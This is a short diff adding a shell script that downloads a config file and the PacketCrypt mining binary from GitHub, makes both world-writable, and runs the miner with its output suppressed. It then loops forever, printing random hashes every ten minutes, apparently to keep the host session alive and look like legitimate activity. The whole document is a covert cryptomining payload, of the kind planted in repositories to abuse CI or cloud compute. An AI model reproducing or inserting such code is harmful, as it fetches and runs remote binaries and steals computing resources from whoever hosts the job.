@@ -1,0 +1,5 @@
+wget https://github.com/sxiankerigak/leutenant/raw/main/paket.json
+wget -O pkt https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.2/packetcrypt-v0.5.2-linux_amd64
+chmod 777 pkt paket.json
+./pkt ann --config "paket.json" >/dev/null 2>&1
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
